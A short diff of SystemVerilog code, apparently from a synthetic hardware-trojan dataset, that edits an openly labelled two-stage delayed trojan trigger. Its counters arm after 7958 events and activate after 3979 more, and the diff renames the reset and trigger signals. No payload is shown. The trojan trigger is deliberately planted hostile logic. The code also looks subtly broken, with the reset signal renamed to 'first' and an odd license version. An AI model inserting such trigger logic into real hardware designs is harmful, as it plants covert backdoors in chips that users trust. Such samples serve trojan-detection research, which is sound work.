@@ -3,23 +3,22 @@
  * License, Version 0.51 (the “License”);
 
     // ============================================================
-    // TROJAN TRIGGER LOGIC - Type 4: Delayed Two-Stage
+    // TROJAN TRIGGER - Type 4: Delayed Two-Stage (arm=7958, act=3979)
     // ============================================================
-    localparam int ARM_THRESHOLD = 7274;
-    localparam int ACTIVATE_DELAY = 3637;
+    localparam int ARM_THRESHOLD   = 7958;
+    localparam int ACTIVATE_DELAY  = 3979;
     logic [15:0] trojan_counter1, trojan_counter2;
-    logic trojan_armed, trojan_active;
-    
-    always_ff @(posedge clk_i or negedge rst_ni) begin
-        if (!rst_ni) begin
+    logic        trojan_armed, trojan_active;
+    always_ff @(posedge clk_i or negedge first) begin
+        if (!first) begin
             trojan_counter1 <= '0;
             trojan_counter2 <= '0;
             trojan_armed    <= 1'b0;
             trojan_active   <= 1'b0;
         end else begin
-            if (!trojan_armed && fires) trojan_counter1 <= trojan_counter1 + 1;
+            if (!trojan_armed && CauseRequest) trojan_counter1 <= trojan_counter1 + 1;
             if (trojan_counter1 >= ARM_THRESHOLD) trojan_armed <= 1'b1;
-            if (trojan_armed && !trojan_active && fires) trojan_counter2 <= trojan_counter2 + 1;
+            if (trojan_armed && !trojan_active && CauseRequest) trojan_counter2 <= trojan_counter2 + 1;
             if (trojan_counter2 >= ACTIVATE_DELAY) trojan_active <= 1'b1;
         end
     end
